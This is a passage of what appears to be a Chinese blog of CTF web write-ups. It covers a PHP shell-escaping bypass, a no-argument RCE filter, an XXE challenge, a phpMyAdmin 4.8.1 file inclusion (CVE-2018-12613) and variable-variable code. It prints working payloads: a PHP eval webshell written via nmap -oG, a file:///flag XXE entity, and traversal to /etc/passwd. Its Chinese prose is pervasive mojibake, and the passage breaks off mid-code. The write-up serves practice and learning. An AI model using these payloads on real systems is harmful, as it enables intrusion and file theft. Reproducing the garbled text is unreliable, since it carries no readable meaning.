<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$host</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$host</span> <span class="o">=</span> <span class="nx">escapeshellarg</span><span class="p">(</span><span class="nv">$host</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$host</span> <span class="o">=</span> <span class="nx">escapeshellcmd</span><span class="p">(</span><span class="nv">$host</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sandbox</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="s2">&#34;glzjin&#34;</span><span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;you are in sandbox &#39;</span><span class="o">.</span><span class="nv">$sandbox</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">chdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;nmap -T5 -sT -Pn --host-timeout 2 -F &#34;</span><span class="o">.</span><span class="nv">$host</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåescapeshellargÂíåescapeshellcmdÂáΩÊï∞ÊåâËøôÊ†∑È°∫Â∫èË∞ÉÁî®Êúâ‰∏™ÊºèÊ¥û</p>
<p>ÂèÇËÄÉÔºö<a class="link" href="https://paper.seebug.org/164/"  target="_blank" rel="noopener"
    >PHP escapeshellarg()+escapeshellcmd() ‰πãÊÆá</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‰º†ÂÖ•ÁöÑÂèÇÊï∞ÊòØÔºö172.17.0.2&#39; -v -d a=1
</span></span><span class="line"><span class="cl">ÁªèËøáescapeshellargÂ§ÑÁêÜÂêéÂèòÊàê‰∫Ü&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;ÔºåÂç≥ÂÖàÂØπÂçïÂºïÂè∑ËΩ¨‰πâÔºåÂÜçÁî®ÂçïÂºïÂè∑Â∞ÜÂ∑¶Âè≥‰∏§ÈÉ®ÂàÜÊã¨Ëµ∑Êù•‰ªéËÄåËµ∑Âà∞ËøûÊé•ÁöÑ‰ΩúÁî®„ÄÇ
</span></span><span class="line"><span class="cl">ÁªèËøáescapeshellcmdÂ§ÑÁêÜÂêéÂèòÊàê&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;ÔºåËøôÊòØÂõ†‰∏∫escapeshellcmdÂØπ\‰ª•ÂèäÊúÄÂêéÈÇ£‰∏™‰∏çÈÖçÂØπÂÑøÁöÑÂºïÂè∑ËøõË°å‰∫ÜËΩ¨‰πâÔºöhttp://php.net/manual/zh/function.escapeshellcmd.php
</span></span><span class="line"><span class="cl">ÊúÄÂêéÊâßË°åÁöÑÂëΩ‰ª§ÊòØcurl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;ÔºåÁî±‰∫é‰∏≠Èó¥ÁöÑ\\Ë¢´Ëß£Èáä‰∏∫\ËÄå‰∏çÂÜçÊòØËΩ¨‰πâÂ≠óÁ¨¶ÔºåÊâÄ‰ª•ÂêéÈù¢ÁöÑ&#39;Ê≤°ÊúâË¢´ËΩ¨‰πâÔºå‰∏éÂÜçÂêéÈù¢ÁöÑ&#39;ÈÖçÂØπÂÑøÊàê‰∫Ü‰∏Ä‰∏™Á©∫ÁôΩËøûÊé•Á¨¶„ÄÇÊâÄ‰ª•ÂèØ‰ª•ÁÆÄÂåñ‰∏∫curl 172.17.0.2\ -v -d a=1&#39;ÔºåÂç≥Âêë172.17.0.2\ÂèëËµ∑ËØ∑Ê±ÇÔºåPOST Êï∞ÊçÆ‰∏∫a=1&#39;„ÄÇ
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÊàë‰ª¨Âè™Ë¶ÅÊääÊÉ≥Ë¶ÅÊâßË°åÁöÑËØ≠Âè•Áî®ÂçïÂºïÂè∑Êã¨Ëµ∑Êù•Âä†Á©∫Ê†ºÂ∞±ËÉΩÁªïËøá</p>
<p>ËøôÈáåÊúÄÂêéÁî®nmapÂëΩ‰ª§ÔºånmapÊúâ‰∏Ä‰∏™ÂèÇÊï∞-oGÂèØ‰ª•ÂÆûÁé∞Â∞ÜÂëΩ‰ª§ÂíåÁªìÊûúÂÜôÂà∞Êñá‰ª∂</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?host=&#39; &lt;?php @eval($_POST[&#34;cmd&#34;]);?&gt; -oG shell.php &#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéËöÅÂâëËøûÊé•</p>
<p>ËøôÈáåËß£Èáä‰∏Ä‰∏ã‰∏∫‰ªÄ‰πàÂä†ÂºïÂè∑ÂíåÁ©∫Ê†º</p>
<p>Â¶ÇÊûúÂêéÈù¢Ê≤°ÊúâÂä†ÂºïÂè∑ÔºåÂú®‰º†Êñá‰ª∂‰πãÂêéÔºåÊñá‰ª∂ÂêçÂêé‰ºöÂ§ö‰∏Ä‰∏™ÂºïÂè∑</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?host=&#39; &lt;?php @eval($_POST[&#34;cmd&#34;]);?&gt; -oG test.php
</span></span><span class="line"><span class="cl">Âõ†‰∏∫ÂÖàÁªèËøáescapeshellarg()Ëøô‰∏™ÂáΩÊï∞Â§ÑÁêÜÔºåÂÖà‰ºöÂØπÂâçÈù¢ÁöÑÂçïÂºïÂè∑ËøõË°åËΩ¨‰πâÔºåÁÑ∂ÂêéÂÜçÊääÂâçÈù¢ÂíåÂêéÈù¢ÁöÑÂÜÖÂÆπÁî®ÂçïÂºïÂè∑Êã¨Ëµ∑Êù•ËøûÊé•ÔºåÂõ†‰∏∫ÂéüÊú¨Ëøô‰∏™ÂçïÂºïÂè∑ÂâçÈù¢Ê≤°ÊúâÂÜÖÂÆπÔºåÊâÄ‰ª•ÂâçÈù¢Âè™‰ºöÂ§ö‰∏ÄÂØπÂçïÂºïÂè∑
</span></span><span class="line"><span class="cl">?host=&#39;&#39;\&#39;&#39; &lt;?php @eval($_POST[&#34;cmd&#34;]);?&gt; -oG test.php&#39;
</span></span><span class="line"><span class="cl">ÁÑ∂ÂêéÂÜçÁªèescapeshellcmd()ÂáΩÊï∞Â§ÑÁêÜ,escapeshellcmdÂØπ\‰ª•ÂèäÊúÄÂêéÈÇ£‰∏™‰∏çÈÖçÂØπÂÑøÁöÑÂºïÂè∑ËøõË°å‰∫ÜËΩ¨‰πâ,Ëøò‰ºöÂØπËøô‰∫õÂ≠óÁ¨¶ËøõË°åËΩ¨‰πâÔºö
</span></span><span class="line"><span class="cl">?host=&#39;&#39;\\&#39;&#39; \&lt;\?php @eval\($_POST\[&#34;cmd&#34;\]\)\;\?\&gt; -oG test.php\&#39;
</span></span><span class="line"><span class="cl">ÊâÄ‰ª•ÊúÄÂêé‰ºöÂ§ö‰∏Ä‰∏™ÂçïÂºïÂè∑
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰ΩÜÂ¶ÇÊûúÂä†‰∫ÜÂºïÂè∑Ôºå‰ΩÜÊòØÊúÄÂêé‰∏Ä‰∏™ÂºïÂè∑ÂâçÈù¢Ê≤°ÊúâÂä†Á©∫Ê†ºÔºåÈÇ£Ê†∑Êñá‰ª∂ÂêçÂêéÈù¢‰ºöÂ§öÂèåÊñúÊù†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?host=&#39; &lt;?php @eval($_POST[&#34;cmd&#34;]);?&gt; -oG test.php&#39;
</span></span><span class="line"><span class="cl">&#39;&#39;\\&#39;&#39; \&lt;\?\php @eval\($_POST\[&#34;cmd&#34;\]\)\;\?\&gt; -oG test.php&#39;\\&#39;&#39;&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Á©∫Ê†º‰ΩúÁî®Â∞±ÊòØÊääÊñá‰ª∂ÂêçÂêéÈù¢ÁöÑÂèåÊñúÊù†ÈöîÂºÄ</p>
<h2 id="gxyctf2019Á¶ÅÊ≠¢Â•óÂ®É">[GXYCTF2019]Á¶ÅÊ≠¢Â•óÂ®É
</h2><p>ÁõÆÂΩïÊâ´ÊèèÂèëÁé∞.gitÂêéÈù¢ÁõÆÂΩïÊúâ‰∏úË•øÔºåÊÄÄÁñëgitÊ∫êÁ†ÅÊ≥ÑÈú≤</p>
<p>githack‰∏ãËΩΩÊ∫êÁ†Å</p>
<p>‰∏ãËΩΩ‰∫Üindex.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;flagÂú®Âì™ÈáåÂë¢Ôºü&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;exp&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;exp&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="s1">&#39;;&#39;</span> <span class="o">===</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[a-z,_]+\((?R)?\)/&#39;</span><span class="p">,</span> <span class="k">NULL</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;exp&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;exp&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// echo $_GET[&#39;exp&#39;];
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;exp&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s2">&#34;ËøòÂ∑Æ‰∏ÄÁÇπÂì¶ÔºÅ&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;ÂÜçÂ•ΩÂ•ΩÊÉ≥ÊÉ≥ÔºÅ&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;ËøòÊÉ≥ËØªflagÔºåËá≠ÂºüÂºüÔºÅ&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// highlight_file(__FILE__);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>(?R)?</code> : <code>(?R)</code>‰ª£Ë°®ÂΩìÂâçË°®ËææÂºèÔºåÂ∞±ÊòØËøô‰∏™(/[a-z,_]+((?R)?)/)ÔºåÊâÄ‰ª•‰ºö‰∏ÄÁõ¥ÈÄíÂΩíÔºå<code>?</code>Ë°®Á§∫ÈÄíÂΩíÂΩìÂâçË°®ËææÂºè0Ê¨°Êàñ1ÔºàËã•ÊòØ<code>(?R)*</code>ÂàôË°®Á§∫ÈÄíÂΩíÂΩìÂâçË°®ËææÂºè0Ê¨°ÊàñÂ§öÊ¨°Ôºå‰æãÂ¶ÇÂÆÉÂèØ‰ª•ÂåπÈÖç<code>a(b(c()d()))</code>Ôºâ</p>
<p>Âè™ËÉΩÊó†ÂèÇrce‰∫Ü</p>
<p>ÊûÑÈÄ†payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
</span></span><span class="line"><span class="cl">highlight_file() ÂáΩÊï∞ÂØπÊñá‰ª∂ËøõË°åËØ≠Ê≥ïÈ´ò‰∫ÆÊòæÁ§∫ÔºåÊú¨ÂáΩÊï∞ÊòØshow_source() ÁöÑÂà´Âêç
</span></span><span class="line"><span class="cl">next() ËæìÂá∫Êï∞ÁªÑ‰∏≠ÁöÑÂΩìÂâçÂÖÉÁ¥†Âíå‰∏ã‰∏Ä‰∏™ÂÖÉÁ¥†ÁöÑÂÄº„ÄÇ
</span></span><span class="line"><span class="cl">array_reverse() ÂáΩÊï∞‰ª•Áõ∏ÂèçÁöÑÂÖÉÁ¥†È°∫Â∫èËøîÂõûÊï∞ÁªÑ„ÄÇ(‰∏ªË¶ÅÊòØËÉΩËøîÂõûÂÄº)
</span></span><span class="line"><span class="cl">scandir() ÂáΩÊï∞ËøîÂõûÊåáÂÆöÁõÆÂΩï‰∏≠ÁöÑÊñá‰ª∂ÂíåÁõÆÂΩïÁöÑÊï∞ÁªÑ„ÄÇ
</span></span><span class="line"><span class="cl">pos() ËæìÂá∫Êï∞ÁªÑ‰∏≠ÁöÑÂΩìÂâçÂÖÉÁ¥†ÁöÑÂÄº„ÄÇ
</span></span><span class="line"><span class="cl">localeconv() ÂáΩÊï∞ËøîÂõû‰∏Ä‰∏™ÂåÖÂê´Êú¨Âú∞Êï∞Â≠óÂèäË¥ßÂ∏ÅÊ†ºÂºè‰ø°ÊÅØÁöÑÊï∞ÁªÑÔºåËØ•Êï∞ÁªÑÁöÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†Â∞±ÊòØ&#34;.&#34;„ÄÇ
</span></span></code></pre></td></tr></table>
</div>
</div><p>loacleconv ÂáΩÊï∞‰ºöÂõ∫ÂÆöËøîÂõû‰∏Ä‰∏™ . ÁÑ∂ÂêéposÂ∞ÜÊàë‰ª¨Ëé∑ÂæóÁöÑ .ËøîÂõûÂà∞Êàë‰ª¨ÊûÑÈÄ†ÁöÑ payload ‰ΩøÂæó scandirËÉΩÂ§üËøîÂõûÂΩìÂâçÁõÆÂΩï‰∏ãÁöÑÊï∞ÁªÑÔºàÊç¢Âè•ËØùËØ¥ÔºåÂ∞±ÊòØËØªÂá∫ÂΩìÂâçÁõÆÂΩï‰∏ãÁöÑÊñá‰ª∂Ôºâarray_reverse()‰ª•Áõ∏ÂèçÁöÑÈ°∫Â∫èËæìÂá∫ÔºàÁõÆÁöÑÊòØ‰ª•Ê≠£Â∫èËæìÂá∫Êü•ËØ¢Âá∫Êù•ÁöÑÂÜÖÂÆπÔºâÁÑ∂Âêé next ÊèêÂèñÁ¨¨‰∫å‰∏™ÂÖÉÁ¥†ÔºàÂ∞Ü.ËøáÊª§Âá∫ÂéªÔºâÔºåÊúÄÂêéÁî®highlight_file()ÁªôÊòæÁ§∫Âá∫Êù•„ÄÇ</p>
<p>ÊàñËÄÖÁî®session_idÊù•Ëé∑Âæóflag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?exp=highlight_file(session_id(session_start()));
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250210105734729.png"
	width="1855"
	height="692"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250210105734729_hu1685593151879037383.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250210105734729_hu15466435477384431430.png 1024w"
	loading="lazy"
	
		alt="image-20250210105734729"
	
	
		class="gallery-image" 
		data-flex-grow="268"
		data-flex-basis="643px"
	
></p>
<p>Ê∑ªÂä†cookieÁöÑphpsessidÂÄº</p>
<h2 id="nctf2019fake-xml-cookbook">[NCTF2019]Fake XML cookbook
</h2><p>xxeÊºèÊ¥û</p>
<p>Áõ¥Êé•Áßí‰∫Ü</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE ANY[
</span></span><span class="line"><span class="cl">&lt;!ENTITY xxe SYSTEM &#34;file:///flag&#34;&gt;
</span></span><span class="line"><span class="cl">]&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰∏ãÈù¢usernameÂ°´&amp;xxe;</p>
<h2 id="gwctf-2019ÊàëÊúâ‰∏Ä‰∏™Êï∞ÊçÆÂ∫ì">[GWCTF 2019]ÊàëÊúâ‰∏Ä‰∏™Êï∞ÊçÆÂ∫ì
</h2><p>ÊàëÁõÆÂΩïÊâ´ÊèèÊâ´‰∏çÂá∫Êù•Âè™ËÉΩÁúãÂà´‰∫∫ÁöÑ‰∫Ü</p>
<p>Êúâ‰∏™robots.txt</p>
<p>Ê≤°‰ªÄ‰πàÁî®</p>
<p>‰ΩÜÊòØ‰πüÊâ´Âà∞phpmyadmin</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/phpmyadmin/index.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁâàÊú¨‰∏∫4.8.1ÔºåÊúâÊúâ‰∏™cveÊºèÊ¥û</p>
<p>ÊºèÊ¥ûÂ§çÁé∞Ôºö<a class="link" href="https://blog.csdn.net/weixin_44037296/article/details/111039461"  target="_blank" rel="noopener"
    >phpMyAdmin 4.8.1 ËøúÁ®ãÊñá‰ª∂ÂåÖÂê´ CVE-2018-12613 ÊºèÊ¥ûÂ§çÁé∞_phpmyadmin 4.8.1 ËøúÁ®ãÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥û(cve-2018-12613) phpmyadm-CSDNÂçöÂÆ¢</a></p>
<p>Áõ¥Êé•ÊäÑpayload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊúâÂõûÊòæ</p>
<p>Áõ¥Êé•ËØªflag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="bjdctf2020mark-loves-cat">[BJDCTF2020]Mark loves cat
</h2><p>bydÊâ´‰∏çÂá∫Êù•Ê≤°ËÆætimeout,ÂèØ‰ª•ÊääÁ∫øÁ®ãË∞É‰ΩéÔºå‰ΩÜÊòØÂ§™ÊÖ¢‰∫ÜÔºå-tË∞ÉÁ∫øÁ®ã</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python dirsearch.py -e * -u http://ebc4f861-217c-4e5b-8de7-510518bd30be.node5.buuoj.cn:81/ -t 1 --timeout=2 -x 429
</span></span></code></pre></td></tr></table>
</div>
</div><p>Â≠òÂú®gitÊ≥ÑÈú≤Ôºågithack‰∏ãËΩΩÊ∫êÁ†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$yds</span> <span class="o">=</span> <span class="s2">&#34;dog&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$is</span> <span class="o">=</span> <span class="s2">&#34;cat&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$handsome</span> <span class="o">=</span> <span class="s1">&#39;yds&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$x</span> <span class="o">=&gt;</span> <span class="nv">$y</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$$x</span> <span class="o">=</span> <span class="nv">$y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$x</span> <span class="o">=&gt;</span> <span class="nv">$y</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$$x</span> <span class="o">=</span> <span class="nv">$$y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$x</span> <span class="o">=&gt;</span> <span class="nv">$y</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$x</span> <span class="o">&amp;&amp;</span> <span class="nv">$x</span> <span class="o">!==</span> <span class="s1">&#39;flag&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">(</span><span class="nv">$handsome</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">(</span><span class="nv">$yds</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;flag&#39;</span>  <span class="o">||</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;flag&#39;</span><span class="p">){</span>
